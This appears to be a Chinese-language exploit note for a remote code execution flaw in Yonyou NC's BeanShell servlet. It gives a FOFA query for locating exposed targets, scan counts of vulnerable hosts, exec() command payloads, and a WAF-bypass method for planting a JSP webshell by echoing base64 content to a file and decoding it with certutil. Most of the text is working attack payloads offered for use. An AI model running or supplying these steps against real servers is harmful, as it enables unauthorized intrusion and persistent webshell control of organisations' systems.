# 1、FOFA搜索关键字
```
icon_hash="1085941792"
```

# 2、检测结果
```
经检测，互联网上开放目标共6845个，疑似存在漏洞目标1475个，访问异常目标5370个
```

# 3、漏洞利用
```
exec("cmd /c whoami.exe")
exec("/bin/sh whoami")
```

# 4、WAF绕过
直接写入webshell会将双引号也写入
```
exec(cmd /c echo \">shell<\") >shell.jsp;
```
shell.jsp的内容为
```
">shell<"
```

可先将webshell内容进行base64编码
```
```
再使用echo写入编码后的webshell
```
exec("cmd /c echo(123>webapps/nc_web/1.txt)
```
最后使用certutil解码webshell
```
exec("cmd /c certutil -f -decode webapps/nc_web/1.txt webapps/nc_web/1.jsp")
```

# References
https://github.com/z1un/NC-BeanShell-RCE
https://jdr2021.github.io/2022/06/14/用友-NC-bsh-servlet-BshServlet-RCE-利用方法/